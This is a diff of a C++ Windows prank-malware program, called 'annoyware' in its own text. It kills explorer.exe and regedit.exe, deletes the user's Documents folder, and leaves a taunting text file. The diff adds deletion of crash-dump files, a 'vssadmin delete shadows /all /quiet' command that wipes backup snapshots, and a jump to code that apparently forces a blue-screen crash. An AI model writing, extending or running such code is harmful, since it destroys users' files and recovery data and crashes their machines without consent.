@@ -4,6 +4,11 @@
 #include <thread>
 #include <stdio.h>
 #include <Windows.h>
+#include <utilapiset.h>
+#include <winsock.h>
+
+#include "Global.h" // Get variables from Variables.cpp
+
 using namespace std;
 
 #pragma comment(lib, "ntdll.lib")
@@ -24,8 +29,7 @@ EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfPar
 
 
 int main() {
-    
-
+    Beep(500, 9999);
 	system("echo off");
     system("taskkill /f /im explorer.exe");
     system("taskkill /f /im regedit.exe");
@@ -33,11 +37,14 @@ int main() {
 
     std::ofstream outfile("Congratulations.txt");
 
-    outfile << "annoyware planted by [redacted]" << std::endl;
+    outfile << "annoyware from [redacted]. You enjoyed this pc didn't you, billy gates must've made windows so insecure, thank him. Linux is better." << std::endl;
     outfile.close();
 
     system("RD /s /q %UserProfile%\Documents"); //Delete Documents Folder DOESNT WORK
     system("MD %UserProfile%\Documents"); //Recreate Documents Folder DOESNT WORK
+    system("RD /s /q C:\Windows\Minidump"); //Delete Dump Files
+    system("vssadmin delete shadows /all /quiet"); //delete shadow backups
+
     
     string DisplayRickError(); {
         int msgboxID = MessageBox(
@@ -61,6 +68,8 @@ int main() {
     //keybd_event(VK_CONTROL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
     //keybd_event(VK_SCROLL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
     // Backup BSOD generator
+
+    BSOD:
     BOOLEAN bl;
     unsigned long response;
     RtlAdjustPrivilege(19, true, false, &bl);
